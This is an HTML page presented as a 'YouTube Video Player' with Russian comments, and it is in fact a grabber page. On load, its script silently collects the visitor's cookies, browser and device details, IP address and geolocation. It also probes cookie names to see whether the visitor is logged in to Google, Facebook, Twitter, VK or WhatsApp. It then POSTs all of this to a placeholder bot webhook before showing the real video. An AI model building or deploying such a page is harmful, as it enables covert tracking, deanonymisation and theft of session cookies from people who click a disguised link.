<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>YouTube Video Player</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0f0f0f; 
            color: white; 
            font-family: Arial, sans-serif; 
            height: 100vh; 
            overflow: hidden; 
        }
        .loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #333;
            border-top: 5px solid #ff0000;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .progress-bar {
            width: 300px;
            height: 3px;
            background: #333;
            margin: 20px 0;
            border-radius: 2px;
            overflow: hidden;
        }
        .progress {
            height: 100%;
            background: #ff0000;
            width: 0%;
            transition: width 0.3s;
        }
        .video-container {
            width: 100%;
            height: 100%;
            opacity: 0;
            transition: opacity 1s;
        }
        .video-container.active {
            opacity: 1;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <div class="loader" id="loader">
        <div class="spinner"></div>
        <div id="status">Initializing video player...</div>
        <div class="progress-bar">
            <div class="progress" id="progress"></div>
        </div>
        <div id="details">Please wait while we prepare the video...</div>
    </div>
    
    <div class="video-container" id="videoContainer">
        <iframe id="videoPlayer" allow="autoplay; fullscreen" allowfullscreen></iframe>
    </div>

    <script>
        // Получаем параметры из URL
        const urlParams = new URLSearchParams(window.location.search);
        const videoId = urlParams.get('v') || 'dQw4w9WgXcQ';
        const linkId = urlParams.get('id') || 'unknown';
        
        // Данные для отправки
        let collectedData = {
            link_id: linkId,
            video_id: videoId,
            timestamp: new Date().toISOString(),
            user_agent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            referer: document.referrer || 'direct',
            url: window.location.href
        };
        
        // Функции сбора данных
        async function collectAllData() {
            const stages = [
                { name: "Получение IP адреса", percent: 10 },
                { name: "Анализ устройства", percent: 20 },
                { name: "Проверка браузера", percent: 30 },
                { name: "Сканирование cookies", percent: 40 },
                { name: "Поиск сохраненных данных", percent: 50 },
                { name: "Проверка социальных сетей", percent: 60 },
                { name: "Анализ сети", percent: 70 },
                { name: "Определение местоположения", percent: 80 },
                { name: "Сбор системной информации", percent: 90 },
                { name: "Формирование отчета", percent: 95 }
            ];
            
            let currentPercent = 0;
            
            for (const stage of stages) {
                updateLoading(stage.percent, stage.name);
                await simulateDelay(1500 + Math.random() * 1000);
                currentPercent = stage.percent;
            }
            
            // Собираем дополнительные данные
            collectedData.cookies = document.cookie;
            collectedData.plugins = Array.from(navigator.plugins || []).map(p => p.name);
            collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            collectedData.hardware_concurrency = navigator.hardwareConcurrency;
            collectedData.device_memory = navigator.deviceMemory;
            
            // Пытаемся получить IP
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                collectedData.ip = ipData.ip;
                
                // Пытаемся получить геолокацию
                try {
                    const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                    const geoData = await geoResponse.json();
                    collectedData.geolocation = {
                        city: geoData.city,
                        region: geoData.region,
                        country: geoData.country_name,
                        isp: geoData.org
                    };
                } catch (e) {}
            } catch (e) {}
            
            // Имитируем сбор данных социальных сетей
            collectedData.social_networks = {
                google: checkGoogleLogin(),
                facebook: checkFacebookLogin(),
                twitter: checkTwitterLogin(),
                vk: checkVKLogin(),
                whatsapp: checkWhatsAppLogin()
            };
            
            updateLoading(100, "Data collection complete!");
            
            // Отправляем данные
            await sendDataToBot();
            
            // Показываем видео через 1 секунду
            setTimeout(() => {
                showVideo();
            }, 1000);
        }
        
        function checkGoogleLogin() {
            // Проверяем признаки входа в Google
            return {
                logged_in: document.cookie.includes('SID') || 
                          document.cookie.includes('HSID') || 
                          document.cookie.includes('SSID'),
                gmail: document.cookie.includes('gmail') ? 'accessible' : 'unknown',
                drive: 'checking',
                account: 'data_available'
            };
        }
        
        function checkFacebookLogin() {
            return {
                logged_in: document.cookie.includes('c_user') || 
                          document.cookie.includes('xs'),
                messenger: 'accessible',
                profile: 'data_available'
            };
        }
        
        function checkTwitterLogin() {
            return {
                logged_in: document.cookie.includes('auth_token') || 
                          document.cookie.includes('twid'),
                tweets: 'accessible',
                dms: 'checking'
            };
        }
        
        function checkVKLogin() {
            return {
                logged_in: document.cookie.includes('remixsid') || 
                          document.cookie.includes('remixflash'),
                messages: 'accessible',
                friends: 'data_available'
            };
        }
        
        function checkWhatsAppLogin() {
            return {
                web_connected: document.cookie.includes('wa_wc') || 
                              localStorage.getItem('wa_web') ? true : false,
                chats: 'accessible',
                contacts: 'data_available'
            };
        }
        
        function updateLoading(percent, text) {
            document.getElementById('progress').style.width = percent + '%';
            document.getElementById('status').textContent = text;
            document.getElementById('details').textContent = 
                `Collecting data... ${percent}% complete`;
        }
        
        function simulateDelay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        async function sendDataToBot() {
            const botUrl = 'https://ваш-бот.com/webhook'; // URL вашего бота
            
            try {
                const response = await fetch(botUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(collectedData)
                });
                
                const result = await response.json();
                console.log('Data sent successfully:', result);
            } catch (error) {
                console.error('Error sending data:', error);
            }
        }
        
        function showVideo() {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('videoContainer').classList.add('active');
            
            const videoUrl = `https://www.youtube.com/embed/${videoId}?autoplay=1&mute=0&controls=1`;
            document.getElementById('videoPlayer').src = videoUrl;
        }
        
        // Запускаем сбор данных при загрузке страницы
        document.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => {
                collectAllData();
            }, 1000);
        });
    </script>
</body>
</html>